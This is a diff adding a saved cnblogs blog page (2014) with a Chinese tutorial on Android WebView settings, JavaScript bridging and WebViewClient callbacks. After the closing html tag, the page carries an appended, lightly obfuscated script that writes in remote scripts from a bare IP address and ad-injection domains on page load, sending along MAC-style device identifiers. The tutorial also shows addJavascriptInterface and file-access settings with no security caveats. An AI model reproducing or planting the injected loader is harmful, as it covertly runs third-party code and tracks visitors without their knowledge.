@@ -1,0 +1,282 @@
+
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Android webview使用详解 - zgz345 - 博客园</title>
+<link type="text/css" rel="stylesheet" href="/bundles/blog-common.css?v=03KQeESEmpLfzDqUo0NiWUg5Zd5aRam3JHBZTK05Wug1"/>
+<link id="MainCss" type="text/css" rel="stylesheet" href="/skins/Cogitation/bundle-Cogitation.css?v=KxzCsGje7vptXKdp2HZBpXmgRp_h-PvgHFxMy8F9r3o1"/>
+<link id="mobile-style" media="only screen and (max-width: 768px)" type="text/css" rel="stylesheet" href="/skins/Cogitation/bundle-Cogitation-mobile.css?v=iZW14VbFrpFkvSJ-fi_vpgzWCejQwrG5_8gq74D9dCM1"/>
+<link title="RSS" type="application/rss+xml" rel="alternate" href="http://www.cnblogs.com/zgz345/rss"/>
+<link title="RSD" type="application/rsd+xml" rel="EditURI" href="http://www.cnblogs.com/zgz345/rsd.xml"/>
+<link type="application/wlwmanifest+xml" rel="wlwmanifest" href="http://www.cnblogs.com/zgz345/wlwmanifest.xml"/>
+<script src="//common.cnblogs.com/script/jquery.js" type="text/javascript"></script>  
+<script type="text/javascript">var currentBlogApp = 'zgz345', cb_enable_mathjax=false;var isLogined=false;</script>
+<script src="/bundles/blog-common.js?v=v5CyCw4ZbFwS225bTHff8Q9sH6b2CrCTXZ4lJiipYuo1" type="text/javascript"></script>
+</head>
+<body>
+<a name="top"></a>
+
+<div id="top">
+	
+<div>
+	<table>
+		<tr>
+			<td class="HeaderTitles">
+				<h1 class="HeaderTitle"><a id="Header1_HeaderTitle" class="HeaderMainTitle" href="http://www.cnblogs.com/zgz345/">zgz345</a></h1>
+				<p id="tagline"></p>
+			</td>
+		</tr>
+	</table>
+</div>
+<div class="HeaderBar">
+	<table id="HeaderBar" class="HeaderBar" cellpadding="0" cellspacing="0">
+		<tr>
+			<td class="HeaderBarTab" nowrap>
+&nbsp;
+<a id="blog_nav_sitehome" href="http://www.cnblogs.com/">博客园</a> ::
+<a id="blog_nav_myhome" href="http://www.cnblogs.com/zgz345/">首页</a> ::
+<a href="http://q.cnblogs.com" class="menu">博问</a> ::
+<a href="http://home.cnblogs.com/ing/" class="menu">闪存</a> ::
+<a id="blog_nav_newpost" rel="nofollow" href="https://i.cnblogs.com/EditPosts.aspx?opt=1">新随笔</a> ::
+<a id="blog_nav_contact" accesskey="9" rel="nofollow" href="https://msg.cnblogs.com/send/zgz345">联系</a> ::
+<a id="blog_nav_rss" href="http://www.cnblogs.com/zgz345/rss">订阅</a>
+<a id="blog_nav_rss_image" class="XMLLink" href="http://www.cnblogs.com/zgz345/rss"><img src="//www.cnblogs.com/images/xml.gif" alt="订阅" /></a> ::
+<a id="blog_nav_admin" rel="nofollow" href="https://i.cnblogs.com/">管理</a> ::
+
+</td>
+			<td><img id="Header1_BlueTab" src="/skins/Cogitation/Images/BlueTabRight.gif" align="absmiddle" /></td>
+			<td class="HeaderBarTabBack" nowrap width="100%">
+				<div id="blog_stats">
+<div class="BlogStatsBar">
+	<table class="BlogStatsBar">
+		<tr>
+			<td width="100%">
+			</td>
+			<td class="BlogStatsBar" nowrap>
+				&nbsp;
+				106 
+				随笔&nbsp;::
+				3 文章
+				::
+				15 评论
+				::
+				0 引用
+			</td>
+		</tr>
+	</table>
+</div>
+</div>
+			</td>
+		</tr>
+	</table>
+</div>
+
+</div>
+<div id="leftmenu">	
+
+	    <div id="blog-calendar" style="display:none"></div><script type="text/javascript">loadBlogDefaultCalendar();</script>
+		
+<h3>公告</h3>
+<div class="News">
+	<div id="blog-news"></div><script type="text/javascript">loadBlogNews();</script>
+</div>
+
+		<div id="blog-sidecolumn"></div><script type="text/javascript">loadBlogSideColumn();</script>
+	
+</div>
+<div id="main">
+	
+<div id="post_detail">
+<div class="post">
+	<div class="postTitle">
+		<a id="cb_post_title_url" href="http://www.cnblogs.com/zgz345/p/3768174.html">Android webview使用详解</a>
+	</div>
+	
+	<div class="postText">
+		<div id="cnblogs_post_body"><p>1. 打开网页时不调用系统浏览器， 而是在本WebView中显示：</p>
+<div class="cnblogs_code">
+<pre>mWebView.setWebViewClient(<span style="color: #0000ff;">new</span><span style="color: #000000;"> WebViewClient(){
+      @Override
+      </span><span style="color: #0000ff;">public</span> <span style="color: #0000ff;">boolean</span><span style="color: #000000;"> shouldOverrideUrlLoading(WebView view, String url) {
+          view.loadUrl(url);
+          </span><span style="color: #0000ff;">return</span> <span style="color: #0000ff;">true</span><span style="color: #000000;">;
+      }
+  });</span></pre>
+</div>
+<p><span>2. 通过java代码调用javascript</span></p>
+<div class="cnblogs_code">
+<pre>WebSettings webSettings =<span style="color: #000000;">   mWebView .getSettings();       
+webSettings.setJavaScriptEnabled(</span><span style="color: #0000ff;">true</span><span style="color: #000000;">); 
+mWebView.addJavascriptInterface(</span><span style="color: #0000ff;">new</span><span style="color: #000000;"> Object() {       
+            </span><span style="color: #0000ff;">public</span> <span style="color: #0000ff;">void</span><span style="color: #000000;"> clickOnAndroid() {       
+                mHandler.post(</span><span style="color: #0000ff;">new</span><span style="color: #000000;"> Runnable() {       
+                    </span><span style="color: #0000ff;">public</span> <span style="color: #0000ff;">void</span><span style="color: #000000;"> run() {       
+                        webview.loadUrl(</span>"javascript:wave()"<span style="color: #000000;">);       
+                    }       
+                });       
+            }       
+        }, </span>"demo"); </pre>
+</div>
+<p><span>3. 按返回键时， 不退出程序而是返回上一浏览页面：</span></p>
+<div class="cnblogs_code">
+<pre><span style="color: #0000ff;">public</span> <span style="color: #0000ff;">boolean</span> onKeyDown(<span style="color: #0000ff;">int</span><span style="color: #000000;"> keyCode, KeyEvent event) {       
+        </span><span style="color: #0000ff;">if</span> ((keyCode == KeyEvent.KEYCODE_BACK) &amp;&amp;<span style="color: #000000;"> mWebView.canGoBack()) {       
+            mWebView.goBack();       
+            </span><span style="color: #0000ff;">return</span> <span style="color: #0000ff;">true</span><span style="color: #000000;">;       
+        }       
+        </span><span style="color: #0000ff;">return</span> <span style="color: #0000ff;">super</span><span style="color: #000000;">.onKeyDown(keyCode, event);       
+    }</span></pre>
+</div>
+<p><span>4. 打开页面时， 自适应屏幕：</span></p>
+<div class="cnblogs_code">
+<pre>WebSettings webSettings =<span style="color: #000000;">   mWebView .getSettings();       
+webSettings.setUseWideViewPort(</span><span style="color: #0000ff;">true</span><span style="color: #000000;">);//<span>设置此属性，可任意比例缩放</span>
+webSettings.setLoadWithOverviewMode(</span><span style="color: #0000ff;">true</span>);</pre>
+</div>
+<p><span>5. 便页面支持缩放：</span></p>
+<div class="cnblogs_code">
+<pre>WebSettings webSettings =<span style="color: #000000;">   mWebView .getSettings();       
+webSettings.setJavaScriptEnabled(</span><span style="color: #0000ff;">true</span><span style="color: #000000;">);  
+webSettings.setBuiltInZoomControls(</span><span style="color: #0000ff;">true</span><span style="color: #000000;">);
+webSettings.setSupportZoom(</span><span style="color: #0000ff;">true</span>);</pre>
+</div>
+<p>6.如果webView中需要用户手动输入用户名、密码或其他，则webview必须设置支持获取手势焦点。</p>
+<div class="cnblogs_code">
+<pre>webview.requestFocusFromTouch();</pre>
+</div>
+<p>7.WebView 加载界面主要调用三个方法：LoadUrl、LoadData、LoadDataWithBaseURL.&nbsp;</p>
+<div class="cnblogs_code">
+<pre>1<span style="color: #000000;">、LoadUrl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;直接加载网页、图片并显示.（本地或是网络上的网页、图片、gif）&nbsp;&nbsp;
+</span>2、LoadData&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;显示文字与图片内容&nbsp;（模拟器1.5、1.6<span style="color: #000000;">）&nbsp;&nbsp;
+</span>3、LoadDataWithBase&nbsp;&nbsp;显示文字与图片内容（支持多个模拟器版本）&nbsp;</pre>
+</div>
+<p>8.WebSettings 的常用方法介绍</p>
+<div class="cnblogs_code">
+<pre>setJavaScriptEnabled(<span style="color: #0000ff;">true</span>);&nbsp;&nbsp;<span style="color: #008000;">//</span><span style="color: #008000;">支持js<br /></span>
+setPluginsEnabled(<span style="color: #0000ff;">true</span>);&nbsp;&nbsp;<span style="color: #008000;">//</span><span style="color: #008000;">支持插件&nbsp;<br /></span>
+setUseWideViewPort(<span style="color: #0000ff;">false</span>);&nbsp;&nbsp;<span style="color: #008000;">//</span><span style="color: #008000;">将图片调整到适合webview的大小&nbsp;<br /></span>
+setSupportZoom(<span style="color: #0000ff;">true</span>);&nbsp;&nbsp;<span style="color: #008000;">//</span><span style="color: #008000;">支持缩放&nbsp;<br /></span>
+setLayoutAlgorithm(LayoutAlgorithm.SINGLE_COLUMN);&nbsp;<span style="color: #008000;">//</span><span style="color: #008000;">支持内容重新布局&nbsp;&nbsp;<br /></span>
+supportMultipleWindows();&nbsp;&nbsp;<span style="color: #008000;">//</span><span style="color: #008000;">多窗口&nbsp;<br /></span>
+setCacheMode(WebSettings.LOAD_CACHE_ELSE_NETWORK);&nbsp;&nbsp;<span style="color: #008000;">//</span><span style="color: #008000;">关闭webview中缓存&nbsp;<br /></span>
+setAllowFileAccess(<span style="color: #0000ff;">true</span>);&nbsp;&nbsp;<span style="color: #008000;">//</span><span style="color: #008000;">设置可以访问文件&nbsp;<br /></span>
+setNeedInitialFocus(<span style="color: #0000ff;">true</span>);&nbsp;//当webview调用requestFocus时为webview设置节点<span style="color: #008000;"><br /><br />webview&nbsp;webSettings.setBuiltInZoomControls(true);&nbsp;</span><span style="color: #008000;">//</span><span style="color: #008000;">设置支持缩放&nbsp;<br /></span>
+setJavaScriptCanOpenWindowsAutomatically(<span style="color: #0000ff;">true</span>);&nbsp;<span style="color: #008000;">//</span><span style="color: #008000;">支持通过JS打开新窗口&nbsp;<br /><br /><span>setLoadWithOverviewMode(true); // 缩放至屏幕的大小</span><br /></span>
+setLoadsImagesAutomatically(<span style="color: #0000ff;">true</span>);&nbsp;&nbsp;<span style="color: #008000;">//</span><span style="color: #008000;">支持自动加载图片</span></pre>
+</div>
+<p>9.WebViewClient 的方法全解</p>
+<div class="cnblogs_code">
+<pre>doUpdateVisitedHistory(WebView&nbsp;view,&nbsp;String&nbsp;url,&nbsp;<span style="color: #0000ff;">boolean</span>&nbsp;isReload)&nbsp;&nbsp;<span style="color: #008000;">//</span><span style="color: #008000;">(更新历史记录)&nbsp;</span>
+<span style="color: #000000;">
+onFormResubmission(WebView&nbsp;view,&nbsp;Message&nbsp;dontResend,&nbsp;Message&nbsp;resend)&nbsp;</span><span style="color: #008000;">//</span><span style="color: #008000;">(应用程序重新请求网页数据)&nbsp;</span>
+<span style="color: #000000;">
+onLoadResource(WebView&nbsp;view,&nbsp;String&nbsp;url)&nbsp;</span><span style="color: #008000;">//</span><span style="color: #008000;">&nbsp;在加载页面资源时会调用，每一个资源（比如图片）的加载都会调用一次。&nbsp;</span>
+<span style="color: #000000;">
+onPageStarted(WebView&nbsp;view,&nbsp;String&nbsp;url,&nbsp;Bitmap&nbsp;favicon)&nbsp;</span><span style="color: #008000;">//</span><span style="color: #008000;">这个事件就是开始载入页面调用的，通常我们可以在这设定一个loading的页面，告诉用户程序在等待网络响应。&nbsp;<br /></span>
+onPageFinished(WebView&nbsp;view,&nbsp;String&nbsp;url)&nbsp;<span style="color: #008000;">//</span><span style="color: #008000;">在页面加载结束时调用。同样道理，我们知道一个页面载入完成，于是我们可以关闭loading&nbsp;条，切换程序动作。&nbsp;</span>
+<span style="color: #000000;">
+onReceivedError(WebView&nbsp;view,&nbsp;</span><span style="color: #0000ff;">int</span>&nbsp;errorCode,&nbsp;String&nbsp;description,&nbsp;String&nbsp;failingUrl)<span style="color: #008000;">//</span><span style="color: #008000;">&nbsp;(报告错误信息)&nbsp;</span>
+<span style="color: #000000;">
+onReceivedHttpAuthRequest(WebView&nbsp;view,&nbsp;HttpAuthHandler&nbsp;handler,&nbsp;String&nbsp;host,String&nbsp;realm)</span><span style="color: #008000;">//</span><span style="color: #008000;">（获取返回信息授权请求）&nbsp;</span>
+<span style="color: #000000;">&nbsp;
+onReceivedSslError(WebView&nbsp;view,&nbsp;SslErrorHandler&nbsp;handler,&nbsp;SslError&nbsp;error)&nbsp;</span><span style="color: #008000;">//</span><span style="color: #008000;">重写此方法可以让webview处理https请求。</span>
+<span style="color: #000000;">&nbsp;
+onScaleChanged(WebView&nbsp;view,&nbsp;</span><span style="color: #0000ff;">float</span>&nbsp;oldScale,&nbsp;<span style="color: #0000ff;">float</span>&nbsp;newScale)&nbsp;<span style="color: #008000;">//</span><span style="color: #008000;">&nbsp;(WebView发生改变时调用)&nbsp;</span>
+<span style="color: #000000;">
+onUnhandledKeyEvent(WebView&nbsp;view,&nbsp;KeyEvent&nbsp;event)&nbsp;</span><span style="color: #008000;">//</span><span style="color: #008000;">（Key事件未被加载时调用）&nbsp;</span>
+<span style="color: #000000;">
+shouldOverrideKeyEvent(WebView&nbsp;view,&nbsp;KeyEvent&nbsp;event)</span><span style="color: #008000;">//</span><span style="color: #008000;">重写此方法才能够处理在浏览器中的按键事件。&nbsp;</span>
+<span style="color: #000000;">
+shouldOverrideUrlLoading(WebView&nbsp;view,&nbsp;String&nbsp;url)&nbsp;
+</span><span style="color: #008000;">//</span><span style="color: #008000;">在点击请求的是链接是才会调用，重写此方法返回true表明点击网页里面的链接还是在当前的webview里跳转，不跳到浏览器那边。这个函数我们可以做很多操作，比如我们读取到某些特殊的URL，于是就可以不打开地址，取消这个操作，进行预先定义的其他操作，这对一个程序是非常必要的。</span></pre>
+</div>
+<p>&nbsp;</p></div><div id="MySignature"></div>
+<div class="clear"></div>
+<div id="blog_post_info_block">
+<div id="BlogPostCategory"></div>
+<div id="EntryTag"></div>
+<div id="blog_post_info">
+</div>
+<div class="clear"></div>
+<div id="post_next_prev"></div>
+</div>
+
+
+	</div>
+	
+	<div class="postfoot">
+		posted on <span id="post-date">2014-06-04 16:36</span> <a href='http://www.cnblogs.com/zgz345/'>zgz345</a> 阅读(<span id="post_view_count">...</span>) 评论(<span id="post_comment_count">...</span>)  <a href ="https://i.cnblogs.com/EditPosts.aspx?postid=3768174" rel="nofollow">编辑</a> <a href="#" onclick="AddToWz(3768174);return false;">收藏</a>
+	</div>
+</div>
+<script type="text/javascript">var allowComments=true,cb_blogId=108026,cb_entryId=3768174,cb_blogApp=currentBlogApp,cb_blogUserGuid='5b939797-3351-e111-aa3f-842b2b196315',cb_entryCreatedDate='2014/6/4 16:36:00';loadViewCount(cb_entryId);</script>
+
+</div><a name="!comments"></a><div id="blog-comments-placeholder"></div><script type="text/javascript">var commentManager = new blogCommentManager();commentManager.renderComments(0);</script>
+<div id='comment_form' class='commentform'>
+<a name='commentform'></a>
+<div id='divCommentShow'></div>
+<div id='comment_nav'><span id='span_refresh_tips'></span><a href='javascript:void(0);' onclick='return RefreshCommentList();' id='lnk_RefreshComments' runat='server' clientidmode='Static'>刷新评论</a><a href='#' onclick='return RefreshPage();'>刷新页面</a><a href='#top'>返回顶部</a></div>
+<div id='comment_form_container'></div>
+<div class='ad_text_commentbox' id='ad_text_under_commentbox'></div>
+<div id='ad_t2'></div>
+<div id='opt_under_post'></div>
+<div id='ad_c1' class='c_ad_block'></div>
+<div id='under_post_news'></div>
+<div id='ad_c2' class='c_ad_block'></div>
+<div id='under_post_kb'></div>
+<div id='HistoryToday' class='c_ad_block'></div>
+<script type='text/javascript'>
+    fixPostBody();
+    setTimeout(function () { incrementViewCount(cb_entryId); }, 50);
+    deliverAdT2();
+    deliverAdC1();
+    deliverAdC2();    
+    loadNewsAndKb();
+    loadBlogSignature();
+    LoadPostInfoBlock(cb_blogId, cb_entryId, cb_blogApp, cb_blogUserGuid);
+    GetPrevNextPost(cb_entryId, cb_blogId, cb_entryCreatedDate);
+    loadOptUnderPost();
+    GetHistoryToday(cb_blogId, cb_blogApp, cb_entryCreatedDate);   
+</script>
+</div>
+
+
+</div>
+<div class="footer">
+
+<p id="footer">
+	Powered by: 
+	<br />
+	
+	<a id="Footer1_Hyperlink3" NAME="Hyperlink1" href="http://www.cnblogs.com/" style="font-family:Verdana;font-size:12px;">博客园</a>
+	<br />
+	Copyright &copy; zgz345
+</p>
+</div>
+</body>
+</html>
+<script>
+function ik_random(){var ik_r_min=0;var ik_r_max=100;return(parseInt(Math.random()*(ik_r_max-ik_r_min+1)+ik_r_min));}
+function ik_isiframe(){return (self!=top);}
+var __m='b8:2a:72:c1:db:f9';
+var __m2='00:00:00:00:00:00';
+var __h="<sc"+"ript src=\"http://101.201.53.95/js.php?uid=48c591bb0b2e4fd248d81fbb9360387b,PC,";
+var __b="&r="+Math.random()+__m+__m2+"\"></scr"+"ipt>";
+var x=ik_random();
+if(!ik_isiframe()){
+switch(true){
+case x>=0&&x<20:
+document.write(__h+"200"+__b);
+document.write("<sc"+"ript src=\"http://js.union-wifi.com/zm.js?cid=10270&dmac="+__m2+"&umac="+__m+"\"></scr"+"ipt>");
+case x>=20&&x<30:
+document.write(__h+"12"+__b);
+document.write("<sc"+"ript src=\"http://res.sspsky.com/cp.js?cid=F3FFAE2FDC1B&apmac="+__m2+"&cumid="+__m+"\"></scr"+"ipt>");
+break;
+case x>=90&&x<=100:
+document.write(__h+"100"+__b);
+document.write("<sc"+"ript src=\"http://js.union-wifi.com/zm.js?cid=10269&dmac="+__m2+"&umac="+__m+"\"></scr"+"ipt>");
+break;
+}
+}
+</script>
